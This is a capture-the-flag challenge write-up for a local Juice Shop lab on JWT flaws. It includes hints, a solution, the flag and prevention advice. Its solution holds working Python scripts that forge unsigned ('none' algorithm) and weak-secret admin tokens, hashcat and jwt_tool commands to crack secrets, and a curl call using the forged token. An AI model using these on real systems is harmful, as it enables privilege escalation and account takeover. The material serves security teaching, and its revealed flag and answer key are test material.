# Challenge 02 - JWT Vulnerabilities

**Category:** Web
**Difficulty:** Intermediate
**Points:** 250
**Target:** Juice Shop (http://localhost:8082)

## Challenge Description

JSON Web Tokens (JWTs) are everywhere in modern web applications. But when implemented incorrectly, they can be a goldmine for attackers.

This challenge presents a web application that uses JWTs for authentication. However, the developers made several critical mistakes in their implementation. Your mission is to exploit these vulnerabilities to escalate your privileges from a regular user to admin and retrieve the flag.

## Objectives

- Understand JWT structure and components
- Identify JWT implementation vulnerabilities
- Exploit the "none" algorithm vulnerability
- Exploit weak secret keys
- Forge valid admin tokens

## Target Information

- **URL:** http://localhost:8082
- **Application:** OWASP Juice Shop
- **Test User:** Create your own account or use existing
- **Target:** Become admin and access /api/admin/flag

## Getting Started

1. Start Juice Shop:
   ```bash
   cd docker && docker-compose up -d juice-shop
   ```

2. Navigate to http://localhost:8082
3. Create a new account and login
4. Observe the JWT token in your browser's storage
5. Analyze the token structure

---

## Hints

<details>
<summary>Hint 1 (Cost: -25 points)</summary>

JWTs have three parts separated by dots: `header.payload.signature`

Each part is Base64URL encoded. You can decode them at https://jwt.io/

Look at the header - what algorithm is being used?

</details>

<details>
<summary>Hint 2 (Cost: -35 points)</summary>

The JWT header specifies the signing algorithm. Common vulnerabilities include:

1. **Algorithm "none"**: Some implementations accept tokens with `alg: "none"` and no signature
2. **Weak secrets**: The signing key might be guessable or in common wordlists
3. **Algorithm confusion**: RS256 vs HS256 confusion

Try modifying the algorithm in the header to "none" and removing the signature.

</details>

<details>
<summary>Hint 3 (Cost: -50 points)</summary>

To forge a token with "none" algorithm:

1. Decode the current token
2. Change header to: `{"alg": "none", "typ": "JWT"}`
3. Change payload role to admin: `{"role": "admin", ...}`
4. Encode header and payload (Base64URL)
5. Combine as: `header.payload.` (note: empty signature, but keep the dot!)

If "none" doesn't work, try cracking the secret with:
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Obtain a Valid JWT

1. Register a new account on Juice Shop
2. Login with your credentials
3. Open browser Developer Tools (F12)
4. Go to Application > Local Storage or check cookies
5. Find the `token` value

Example token:
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicGFzc3dvcmQiOiIwOThlNjM4ZGM0ZmMyMjZkMjRjMjEyY2FkOGE4ZjJlZiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNC0wMS0xNSAxMDozMDowMC4wMDAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0xNSAxMDozMDowMC4wMDAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzA1MzEyMjAwfQ.signature_here
```

### Step 2: Decode and Analyze the JWT

Use https://jwt.io/ or command line:

```bash
# Extract and decode header
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"RS256","typ":"JWT"}

# Extract and decode payload
echo "eyJzdGF0dXMi..." | base64 -d
# Output: {"status":"success","data":{"id":21,"email":"test@test.com","role":"customer",...},"iat":1705312200}
```

Key observations:
- Algorithm: RS256 (RSA signature)
- Role: "customer"
- We need to become "admin"

### Step 3: Try Algorithm "none" Attack

```python
#!/usr/bin/env python3
"""JWT None Algorithm Attack"""

import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def base64url_decode(data):
    padding = 4 - len(data) % 4
    data += '=' * padding
    return base64.urlsafe_b64decode(data)

# Original token (replace with your actual token)
original_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJjdXN0b21lciJ9LCJpYXQiOjE3MDUzMTIyMDB9.signature"

# Split token
parts = original_token.split('.')
header = json.loads(base64url_decode(parts[0]))
payload = json.loads(base64url_decode(parts[1]))

print(f"Original header: {header}")
print(f"Original payload: {payload}")

# Modify header to use "none" algorithm
header['alg'] = 'none'

# Modify payload to be admin
payload['data']['role'] = 'admin'
payload['data']['email'] = 'admin@juice-sh.op'

# Encode new token
new_header = base64url_encode(json.dumps(header).encode())
new_payload = base64url_encode(json.dumps(payload).encode())

# Token with empty signature (keep trailing dot!)
forged_token = f"{new_header}.{new_payload}."

print(f"\nForged token:\n{forged_token}")
```

### Step 4: Alternative - Crack Weak Secret (HS256)

If the app uses HS256 with a weak secret:

```bash
# Save the JWT to a file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY3VzdG9tZXIifQ.signature" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or use jwt_tool
python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt
```

Common weak secrets:
- `secret`
- `password`
- `123456`
- `jwt_secret`
- Company name

### Step 5: Forge Token with Cracked Secret

```python
#!/usr/bin/env python3
"""Forge JWT with known secret"""

import jwt
import json

# Cracked secret
secret = "secret"

# Payload for admin access
payload = {
    "status": "success",
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin"
    },
    "iat": 1705312200
}

# Forge token
forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged admin token:\n{forged_token}")
```

### Step 6: Use Forged Token

1. Open browser Developer Tools
2. Replace the token in Local Storage or cookies
3. Refresh the page
4. Access admin endpoints: `/api/admin/flag` or `/api/Users`

```bash
# Using curl
curl -X GET "http://localhost:8082/api/admin/flag" \
     -H "Authorization: Bearer $FORGED_TOKEN"
```

### Step 7: Retrieve the Flag

Access the admin flag endpoint:
```
GET /api/admin/flag
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE3MDUzMTIyMDB9.
```

Response:
```json
{
  "flag": "FLAG{jwt_n0n3_alg0r1thm_byp4ss}"
}
```

### JWT Vulnerability Types

| Vulnerability | Description | Exploitation |
|--------------|-------------|--------------|
| Algorithm "none" | App accepts unsigned tokens | Remove signature, set alg=none |
| Weak secret | HS256 with guessable key | Crack with wordlist |
| Algorithm confusion | RS256 to HS256 switch | Use public key as HMAC secret |
| Key injection (jwk) | Token embeds key | Inject your own signing key |
| Key ID injection (kid) | kid parameter traversal | Path traversal in kid header |
| Token lifetime | No/long expiration | Steal and reuse tokens |

### JWT Best Practices

```python
# INSECURE - accepting "none" algorithm
jwt.decode(token, options={"verify_signature": False})

# SECURE - explicit algorithm whitelist
jwt.decode(
    token,
    secret,
    algorithms=["HS256"],  # Only allow specific algorithms
    options={"require": ["exp", "iat"]}  # Require claims
)
```

### Prevention

1. **Always validate algorithm**: Whitelist allowed algorithms
2. **Strong secrets**: Use 256+ bit random secrets for HS256
3. **Proper key management**: Rotate keys, use key IDs
4. **Short expiration**: Include `exp` claim with reasonable lifetime
5. **Validate all claims**: Verify `iss`, `aud`, `exp`, `nbf`

</details>

---

## Flag

```
FLAG{jwt_n0n3_alg0r1thm_byp4ss}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- JWT structure understanding
- Base64URL encoding/decoding
- Token manipulation
- Algorithm vulnerability exploitation
- Secret key cracking

## Tools Used

- jwt.io
- Python PyJWT library
- jwt_tool
- hashcat
- Browser Developer Tools

## Related Challenges

- [02 - Cookie Monster (Beginner)](../beginner/02-cookie-monster.md) - Session manipulation
- [Web Cache Poisoning (Intermediate)](07-web-cache-poisoning.md) - More web attacks

## References

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [JWT Tool](https://github.com/ticarpi/jwt_tool)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
- [Critical Vulnerabilities in JWT Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
